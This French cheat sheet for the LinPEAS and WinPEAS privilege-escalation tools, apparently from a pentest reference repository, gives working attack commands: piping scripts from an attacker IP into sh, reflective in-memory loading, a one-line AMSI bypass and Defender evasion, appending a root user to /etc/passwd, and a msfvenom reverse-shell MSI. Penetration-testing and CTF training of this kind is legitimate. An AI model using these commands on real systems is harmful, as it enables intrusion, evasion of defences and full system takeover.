<!-- language-home-navigation -->
[🏠 Page d'accueil Française](../../README.fr.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇮🇹 Italiano](README.it.md)

[🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 🦹 PEASS-ng (LinPEAS & WinPEAS) - Aide-mémoire complet

[🇹🇷 Türkçe Sürüm](translations/README.tr.md)
```
  ██████╗ ███████╗ █████╗ ███████╗███████╗      ███╗   ██╗ ██████╗ 
  ██╔══██╗██╔════╝██╔══██╗██╔════╝██╔════╝      ████╗  ██║██╔════╝ 
  ██████╔╝█████╗  ███████║███████╗███████╗█████╗██╔██╗ ██║██║  ███╗
  ██╔═══╝ ██╔══╝  ██╔══██║╚════██║╚════██║╚════╝██║╚██╗██║██║   ██║
  ██║     ███████╗██║  ██║███████║███████║      ██║ ╚████║╚██████╔╝
  ╚═╝     ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝      ╚═╝  ╚═══╝ ╚═════╝ 
             LinPEAS & WinPEAS Privilege Escalation Suite
```
<p align="center">
  <img src="https://img.shields.io/badge/PEASS--ng-PrivEsc-red?style=for-the-badge" alt="PEASS-ng">
  <img src="https://img.shields.io/badge/LinPEAS-Linux_PrivEsc-blue?style=for-the-badge" alt="LinPEAS">
  <img src="https://img.shields.io/badge/WinPEAS-Windows_PrivEsc-orange?style=for-the-badge" alt="WinPEAS">
  <img src="https://img.shields.io/badge/Automated-Enumeration-green?style=for-the-badge" alt="Automatisé">
</p>

<p align="center">
  <b>🔍 Les outils automatisés d'élévation de privilèges les plus populaires au monde pour les systèmes Linux et Windows</b>
</p>

---

## 📋 Table des matières

- [Introduction](#-introduction)
- [Légende des couleurs et comment lire la sortie](#-color-legend--how-to-read-output)
- [LinPEAS (Linux Privilege Escalation)](#-linpeas-linux-privilege-escalation)
  - [Téléchargement et exécution en mémoire](#download--in-memory-execution)
  - [Options de ligne de commande](#options de ligne de commande)
  - [Vecteurs de base vérifiés par LinPEAS](#core-vectors-checked-by-linpeas)
  - [Furtivité et évasion AV](#stealth--av-evasion)
- [WinPEAS (Escalation de privilèges Windows)](#-winpeas-windows-privilege-escalation)
  - [Méthodes d'exécution (.exe vs .bat)](#execution-methods-exe-vs-bat)
  - [Exécuter WinPEAS en mémoire](#running-winpeas-in-memory)
  - [Vecteurs de base vérifiés par WinPEAS](#core-vectors-checked-by-winpeas)
  - [Contourner Windows Defender et AMSI](#bypassing-windows-defender--amsi)
- [Interprétation des résultats hautement prioritaires](#-interprétation-des résultats-haute-prioritaires)
- [Tableau de référence rapide](#-quick-reference-table)
- [Conseils et bonnes pratiques](#-conseils--meilleures pratiques)
- [Mentions légales](#-legal-disclaimer)
- [Ressources](#-ressources)

---

## 🎯Présentation

**PEASS-ng** (Privilege Escalation Awesome Scripts SUITE - nouvelle génération), créé par Carlos Polop, est la collection standard de facto d'outils d'audit automatisés utilisés pour découvrir les vecteurs d'escalade de privilèges sur les systèmes compromis :

- **LinPEAS :** Un script Bash tout-en-un qui recherche les erreurs de configuration, les informations d'identification, les fichiers inscriptibles, les binaires SUID, les exploits du noyau, les tâches cron et les conteneurs sur les systèmes Linux/Unix.
- **WinPEAS :** Disponible sous forme de binaire .NET compilé autonome (`winPEASany.exe`, `winPEASx64.exe`) et de script batch léger (`winPEAS.bat`) pour l'audit des postes de travail Windows, des membres de domaine et des serveurs.

---

## 🎨 Légende des couleurs et comment lire la sortie

Le pouvoir déterminant de PEASS est son système automatisé d’évaluation des couleurs :

| Couleur | Importance | Signification |
|-------|--------------|---------|
| 🔴 **ROUGE/JAUNE** | 🚨 **CRITIQUE (99% PrivEsc)** | Vecteur d’élévation de privilèges hautement fiable. Il faut vérifier immédiatement ! |
| 🔴 **ROUGE** | ⚠️ **Intéressant** | Configuration inhabituelle, paramètre autre que celui par défaut ou candidat aux informations d'identification. |
| 🟡 **JAUNE** | ℹ️ **Informatif** | Découverte notable qui pourrait faire partie d’une chaîne d’exploitation. |
| 🔵 **CYAN / BLEU** | 👥 **Contexte** | Utilisateurs, groupes et informations système standard. |

> **Règle d'or :** Faites d'abord défiler directement jusqu'aux surbrillances **ROUGE/JAUNE** ! Si vous voyez du texte avec un fond jaune et des lettres rouges, un vecteur d'exploit est presque garanti.

---

## 🐧 LinPEAS (escalade des privilèges Linux)

### Téléchargement et exécution en mémoire

Vous avez rarement besoin d'écrire `linpeas.sh` sur le disque. Exécutez-le directement en mémoire à l'aide des utilitaires UNIX standards :
```bash
# 1. From attacker Python web server directly into bash
curl -L http://10.10.14.5:8000/linpeas.sh | sh

# Alternative using wget
wget -q -O - http://10.10.14.5:8000/linpeas.sh | sh

# 2. Download from official GitHub directly (if target has outbound internet access)
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# 3. Save output to file and review with colors preserved
./linpeas.sh -a > /tmp/linpeas.txt
less -r /tmp/linpeas.txt
```
### Options de ligne de commande
```bash
# Run all checks (including slower exhaustive searches)
./linpeas.sh -a

# Fast mode (skips slow regex / deep file checks)
./linpeas.sh -q

# Password provided for automated 'sudo -l' testing
./linpeas.sh -p 'KnownPassword123'

# Network-only checks (active connections, ARP cache, listening ports)
./linpeas.sh -N

# System information only
./linpeas.sh -s
```
### Vecteurs de base vérifiés par LinPEAS

1. **Mauvaises configurations Sudo (`sudo -l`) :**
   - Commandes exécutables en tant que root sans mot de passe (`NOPASSWD`).
   - Réutilisation du token Sudo / CVE-2021-3156 (Baron Samedit).
2. **Binaires SUID / SGID :**
   - Binaires avec autorisations root (`chmod +s`). Références croisées avec **GTFOBins**.
3. **Capacités Linux :**
   - Binaires avec des capacités élevées comme `cap_setuid+ep` (par exemple, `python3`, `tar`, `perl`).
4. **Tâches et minuteries planifiées :**
   - Crontabs (`/etc/crontab`, `/var/spool/cron/*`) et scripts programmés inscriptibles.
   - Minuteries Systemd (`systemctl list-timers`).
5. **Détournement de chemin et d'environnement :**
   - Répertoires inscriptibles dans `$PATH`, recherches de commandes relatives dans les scripts.
6. **Exploitation du noyau :**
   - Version du noyau vérifiée par rapport aux exploits connus (Dirty COW, Dirty Pipe, OverlayFS).
7. **Écrasement de racine NFS :**
   - Répertoires partagés montés avec `no_root_squash` dans `/etc/exports`.
8. **Récolte d'informations d'identification :**
   - Mots de passe en texte clair dans `.bash_history`, fichiers de configuration (`wp-config.php`, `.env`), clés SSH (`id_rsa`) et vidages de mémoire.

---

## 🪟 WinPEAS (augmentation des privilèges Windows)

### Méthodes d'exécution (.exe vs .bat)

WinPEAS est fourni sous plusieurs formats :
- **`winPEASx64.exe` / `winPEASany.exe` :** Écrit en C#/.NET. Le plus complet ; effectue des vérifications approfondies du registre, de l'API et des informations d'identification.
- **`winPEAS.bat` :** Script batch simple. Hautement compatible avec les anciennes versions de Windows, ne nécessite aucune dépendance .NET et évite certaines détections binaires statiques.
```cmd
:: Run winPEAS binary with full color output
winPEASx64.exe

:: Run stealthily and redirect to text file
winPEASx64.exe > C:\Windows\Temp\out.txt

:: Fast check without heavy registry and file searches
winPEASx64.exe quiet
```
### Exécuter WinPEAS en mémoire

Pour éviter d'enregistrer des fichiers sur disque sur les postes de travail audités, chargez WinPEAS directement dans la mémoire PowerShell :
```powershell
# In-memory execution using Net.WebClient
$pe = (New-Object System.Net.WebClient).DownloadData('http://10.10.14.5:8000/winPEASx64.exe')
[System.Reflection.Assembly]::Load($pe)
[winPEAS.Program]::Main("")
```
### Vecteurs de base vérifiés par WinPEAS

1. **Autorisations de service et chemins non cités :**
   - **Chemins de service non cités :** Chemins binaires de service avec des espaces et sans guillemets (`C:\Program Files\App\service.exe` -> l'attaquant place `C:\Program.exe`).
   - **Autorisations de service faibles :** Utilisateurs non-administrateurs disposant de `SERVICE_ALL_ACCESS` ou `SERVICE_CHANGE_CONFIG`.
2. **Piratage de DLL :**
   - Services tentant de charger des DLL inexistantes à partir de répertoires accessibles en écriture par l'utilisateur.
3. **ToujoursInstallerÉlevé :**
   - Clés de registre `AlwaysInstallElevated = 1` permettant à tout utilisateur d'installer des packages MSI élevés avec `msiexec`.
4. **Privilèges de jetons (SeImpersonate / SeAssignPrimaryToken) :**
   - Exploitable via les exploits Potato (SweetPotato, GodPotato, PrintSpoofer) pour passer des comptes de service (`IIS APPPOOL`, `LOCAL SERVICE`) à `NT AUTHORITY\SYSTEM`.
5. **Magasins d'informations d'identification et connexion automatique :**
   - Mots de passe en texte clair dans le registre (`DefaultPassword` dans Winlogon).
   - Connexions RDP enregistrées, informations d'identification Vault, blobs DPAPI, sessions PuTTY, mots de passe WiFi.
6. **Fichiers de sauvegarde SAM et SYSTÈME :**
   - Copies inscriptibles ou lisibles de `C:\Windows\Repair\SAM` ou `C:\Windows\System32\config\RegBack\SAM`.

### Contourner Windows Defender et AMSI

Windows Defender signale activement les versions compilées de `winPEASx64.exe`. Pour exécuter WinPEAS dans des environnements surveillés :
```powershell
# 1. Obfuscate winPEAS binary using Invisibility / Donut or custom compiler
# 2. Patch AMSI in PowerShell session before running in memory:
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# 3. Alternatively, fall back to winPEAS.bat (often unflagged by AV):
curl.exe http://10.10.14.5:8000/winPEAS.bat -o %TEMP%\wp.bat && %TEMP%\wp.bat
```
---

## 🎯 Interprétation des résultats hautement prioritaires

### 1. LinPEAS : écrit `/etc/passwd`
Si LinPEAS marque `/etc/passwd` en **ROUGE/JAUNE** :
```bash
# Generate password hash:
openssl passwd -1 -salt evil SaltPass123
# Append root user:
echo 'root2:$1$evil$TNy7V...:0:0:root:/root:/bin/bash' >> /etc/passwd
su root2
```
### 2. WinPEAS : `SeImpersonatePrivilege` présent
Si vous détenez `SeImpersonatePrivilege` :
```powershell
# Elevate instantly using GodPotato or PrintSpoofer:
.\GodPotato-NET4.exe -cmd "cmd.exe /c whoami"
```
### 3. WinPEAS : `AlwaysInstallElevated` défini sur 1
```powershell
# Generate malicious MSI payload:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f msi -o priv.msi
# Run installer as low-privileged user:
msiexec /quiet /qn /i priv.msi
```
---

## 📊 Tableau de référence rapide

| Cible | Commande | Objectif |
|--------|---------|---------|
| **Linux (à distance)** | `curl -L http://<IP>/linpeas.sh \| sh` | Exécution en mémoire sans toucher au disque |
| **Linux (local)** | `./linpeas.sh -a > out.txt` | Audit complet enregistré dans un fichier texte |
| **Linux (rapide)** | `./linpeas.sh -q` | Analyse rapide en ignorant les recherches de fichiers lentes |
| **Windows (CLI)** | `winPEASx64.exe quiet` | Exécution rapide avec un bruit réduit |
| **Windows (Mémoire)**| `[System.Reflection.Assembly]::Load($pe)` | Charger le binaire .NET en mémoire via PowerShell |
| **Windows (par lots)** | `winPEAS.bat` | Exécution sans dépendance pour l'évasion héritée/AV |

---

## 💡 Conseils et bonnes pratiques

1. **Examiner le résultat à l'aide de `less -r` :**
   Lorsque vous redirigez la sortie vers un fichier (`./linpeas.sh > linpeas.txt`), affichez-la toujours en utilisant `less -r linpeas.txt` ou `cat linpeas.txt` afin que les codes d'échappement de couleur ANSI du terminal s'affichent correctement.
2. **Transfert via le port 80/443 :**
   Lors de la préparation de LinPEAS ou WinPEAS sur la machine de votre attaquant, hébergez votre serveur Web sur le port `80` ou `443` à l'aide de `python3 -m http.server 80` pour contourner les règles strictes de sortie du pare-feu cible.
3. **Ne négligez pas les informations d'identification cachées :**
   Vérifiez les sections « Fichiers intéressants » et « Credentials Cloud » de la sortie LinPEAS ; souvent, les jetons API en texte brut ou les informations d'identification AWS accordent des privilèges plus élevés qu'un exploit local.

---

## ⚠️ Mentions légales

> **IMPORTANT :** Les scripts PEASS-ng effectuent un audit interne complet et une découverte de configuration. Ils ne doivent être exécutés que sur des systèmes pour lesquels vous disposez d'une autorisation documentée lors de tests d'intrusion autorisés, d'exercices CTF ou d'audits de sécurité internes.

---

## 📚 Ressources

- [Dépôt GitHub officiel PEASS-ng](https://github.com/carlospolop/PEASS-ng)
- [Bible HackTricks Cloud et escalade de privilèges](https://book.hacktricks.xyz/)
- [GTFOBins - Exploitation des binaires Unix](https://gtfobins.github.io/)
- [LOLBAS - Windows vivant de la terre](https://lolbas-project.github.io/)